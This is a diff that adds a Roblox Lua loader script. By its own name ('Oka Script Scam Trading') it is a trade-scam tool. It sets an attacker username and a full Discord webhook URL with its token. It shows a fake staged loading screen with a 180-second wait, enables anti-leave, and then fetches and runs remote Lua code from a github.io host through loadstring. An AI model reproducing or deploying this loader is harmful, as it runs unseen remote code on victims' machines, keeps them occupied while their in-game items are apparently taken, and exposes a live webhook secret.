@@ -1,0 +1,13 @@
+UserName = "okarichi"
+Webhook = "https://discord.com/api/webhooks/1101944108433543168/bitQRSENEHWAKa42NqErSo9EmGczGjp1ZcdiN9HsBz9TbDM3HIV4mQKNXVNi1ZohvpzH"
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = false
+
+_G.ScriptName = "Oka Script Scam Trading"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180
+
+loadstring(game:HttpGet("https://rizz69.github.io/Main.lua", true))() 
